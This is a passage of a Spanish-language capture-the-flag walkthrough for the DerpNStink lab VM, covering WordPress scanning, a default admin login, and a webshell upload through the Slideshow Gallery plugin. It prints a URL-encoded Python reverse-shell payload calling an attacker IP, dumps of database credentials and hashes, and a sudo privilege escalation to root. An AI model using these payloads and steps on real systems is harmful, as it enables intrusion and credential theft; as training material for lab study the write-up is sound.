 | [!] Title: Slideshow Gallery <= 1.6.8 - XSS and SQLi
 |     Fixed in: 1.6.9
 |     References:
 |      - https://wpscan.com/vulnerability/57216d76-7cba-477e-a6b5-1e409913a0fc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18017
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18018
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18019
 |      - https://plugins.trac.wordpress.org/changeset?reponame=&new=1974812%40slideshow-gallery&old=1907382%40slideshow-gallery
 |      - https://ansawaf.blogspot.com/2019/04/xss-and-sqli-in-slideshow-gallery.html
 |
 | Version: 1.4.6 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |======================================================================================================|

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] unclestinky
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 20

[+] Finished: Wed Apr 21 17:54:19 2021
[+] Requests Done: 93061
[+] Cached Requests: 37
[+] Data Sent: 26.56 MB
[+] Data Received: 12.584 MB
[+] Memory used: 430.188 MB
[+] Elapsed time: 00:04:40

```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp3.jpg" width=80% />

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp4.jpg" width=80% />

> Resaltan dos detalles: el plugin "slideshow-gallery" vulnerable y los usuarios de Wordpress: admin y unclestinky.

## 4. Vulnerando WORDPRESS

### 4.1. Cracking ONLINE

- Ya que tenemos usuarios de Wordpress toca realizar CRACKING ONLINE con los usuarios identificados.
- El usuario y password es super básico: admin - admin.

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp5.jpg" width=80% />

### 4.2. Explotando la Vulnerabilidad del plugin SLIDESHOW-GALLERY

- Toca leer la vulnerabilidad del plugin y es posible subir un webshell: https://www.exploit-db.com/exploits/34681/

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp6.jpg" width=80% />

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp7.jpg" width=80% />

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp8.jpg" width=80% />

- Finalmente obtener una SHELL REVERSA

```
http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/backdoor.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.104%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp9.jpg" width=80% />

## 5. Enumerando información de MYSQL

- Con el acceso obtenido obtenemos información de MYSQL.

```
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp10.jpg" width=80% />

- En la fase enumeración identificamos un PHPMYADMIN. Ingresamos con las credenciales obtenidas.

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp11.jpg" width=80% />

- Crackeamos los hashes identificados.

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp12.jpg" width=80% />

```
|localhost|root|*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA|Y|Y|Y|Y|Y|Y					mysql 
|derpnstink|root|*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA|Y|Y|Y|Y|Y|Y|Y 				mysql
|127.0.0.1|root|*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA|Y|Y|Y|Y|Y|Y|Y|Y|Y				mysql
|::1|root|*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA|Y|Y|Y|Y|Y|Y|Y|Y|Y|Y|Y|				mysql
|localhost|debian-sys-maint|*B95758C76129F85E0D68CF79F38B66F156804E93|Y|Y|Y|Y|Y
|derpnstink.local|unclestinky|*9B776AFB479B31E8047026F1185E952DD1E530CB|N|N|N|N|N|N		wedgie57
|localhost|phpmyadmin|*4ACFE3202A5FF5CF467898FC58AAB1D615029441|N|N|N|N|N|N|N|N|N		admin 
```

## 6. Acceso a usuarios del sistema operativo

### 6.1. Acceso con el usuario STINKY

- El sistema LINUX tiene el usuario "stinky" y podemos ingresar con el pass: wedgie57

```
www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog$ whoami
whoami
stinky
stinky@DeRPnStiNK:/var/www/html/weblog$ 
```

### 6.2. Acceso con el usuario MRDERP

- Enncontramos un archivo de texto que habla de un sniffer.
- En la carpeta "DOCUMENTS" encontramos un archivo PCAP, vamos a analizar que contiene.

```
stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt
cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp13.jpg" width=80% />

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp14.jpg" width=80% />

- Encontramos el usuario: mrderp y el pass: derpderpderpderpderpderpderp

```
</html/weblog/wp-content/uploads/slideshow-gallery$ su mrderp
su mrderp
Password: derpderpderpderpderpderpderp

mrderp@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ 
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp15.jpg" width=80% />


## 7. Elevando Privilegios

- Elevamos privilegios a través de SUDO.
- El SCRIPT derpy* NO EXISTE, asi que toca crearlo para elevar privilegios.

```
mrderp@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ sudo -l
<html/weblog/wp-content/uploads/slideshow-gallery$ sudo -l                   
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

```
<html/weblog/wp-content/uploads/slideshow-gallery$ sudo -l                   
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cd /home/mrderp/binaries/
<html/weblog/wp-content/uploads/slideshow-gallery$ cd /home/mrderp/binaries/ 
mrderp@DeRPnStiNK:~/binaries$ ls -la
ls -la
total 16
drwxrwxr-x  2 mrderp mrderp 4096 Apr 21 18:33 .
drwx------ 11 mrderp mrderp 4096 Apr 23 07:53 ..
-rw-rw-r--  1 mrderp mrderp   23 Apr 21 23:32 bash.txt
-rwxrwxr-x  1 mrderp mrderp   23 Apr 21 18:33 derpy1
mrderp@DeRPnStiNK:~/binaries$ cat derpy1
cat derpy1
#!/bin/bash
 /bin/bash
mrderp@DeRPnStiNK:~/binaries$ sudo /home/mrderp/binaries/derpy1
sudo /home/mrderp/binaries/derpy1
root@DeRPnStiNK:~/binaries# id
id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# 
```

<img src="https://github.com/El-Palomo/DerpNStink/blob/main/derp16.jpg" width=80% />



